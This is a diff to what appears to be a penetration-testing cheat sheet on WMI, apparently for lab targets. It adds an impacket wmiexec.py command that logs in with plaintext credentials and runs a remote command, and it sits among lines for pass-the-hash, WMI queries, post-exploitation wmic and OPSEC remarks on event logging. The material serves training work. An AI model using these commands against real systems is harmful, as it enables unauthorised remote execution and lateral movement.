@@ -27,6 +27,8 @@ python3 IOXIDResolver.py -t 10.129.2.15
 # Password Login
 # ⚠️ OPSEC: Moderate. WMI process creation is logged (Event 4688).
 impacket-wmiexec WORKGROUP/Administrator:Password123@10.129.2.15
+# OR
+/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
 
 # Pass-The-Hash (PTH)
 # -hashes LM:NT
@@ -56,7 +58,7 @@ impacket-wmiquery Administrator:Pass123@10.129.2.15 -n root/SecurityCenter2 -c "
 ## 4. Post-Exploitation (Local WMIC)
 **Context:** You have a shell on the target. 
 **Note:** `wmic` is deprecated but still present. PowerShell `Get-CimInstance` is the modern alternative.
-```shell
+```powershell
 # System Info (OS, Service Pack, Arch)
 wmic os get Caption,CSDVersion,OSArchitecture,InstallDate
 
